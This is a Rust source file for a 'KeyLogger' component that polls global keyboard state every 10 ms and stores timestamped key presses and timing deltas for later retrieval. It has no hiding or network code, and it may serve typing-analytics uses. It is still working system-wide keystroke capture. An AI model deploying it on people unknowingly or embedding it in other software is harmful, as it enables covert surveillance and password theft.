use chrono::prelude::*;
use device_query::{DeviceQuery, DeviceState};
use serde::Serialize;
use std::{
    sync::{Arc as A, Mutex as M},
    thread,
};

#[derive(Serialize, Debug, Clone)]
pub struct Key {
    pub unix: i64,
    pub delta: i64,
    pub keyboard: Vec<String>,
}
type Keys = A<M<Vec<Key>>>;

#[derive(Debug, Clone)]
pub struct KeyLogger {
    keys: Keys,
    last_read_unix: i64,
}

impl KeyLogger {
    pub fn new() -> Self {
        let keys = A::new(M::new(Vec::new()));
        let key_log_clone = Keys::clone(&keys);
        thread::spawn(move || Self::listener(key_log_clone));
        Self {
            keys,
            last_read_unix: i64::MIN,
        }
    }

    fn listener(keys: Keys) {
        let device_state = DeviceState::new();

        let mut prev_keys = vec![];
        let mut prev_date: DateTime<Local> = Local::now();

        loop {
            let local: DateTime<Local> = Local::now();
            let unix = local.timestamp_millis();
            let delta = local.timestamp_millis() - prev_date.timestamp_millis();

            let typed_keys = device_state.get_keys();
            if typed_keys != prev_keys && !typed_keys.is_empty() {
                let key = Key {
                    // time: local,
                    unix,
                    delta,
                    keyboard: typed_keys.iter().map(|key| key.to_string()).collect(),
                };

                keys.lock().unwrap().push(key);

                prev_date = local;
            }

            prev_keys = typed_keys;

            std::thread::sleep(std::time::Duration::from_millis(10));
        }
    }

    pub fn get_unread_keys(&mut self) -> Vec<Key> {
        let mut unread_keys: Vec<Key> = Vec::new();
        for key in self.keys.lock().unwrap().iter() {
            if key.unix > self.last_read_unix {
                unread_keys.push(key.clone());
                self.last_read_unix = key.unix;
            }
        }
        unread_keys
    }
}
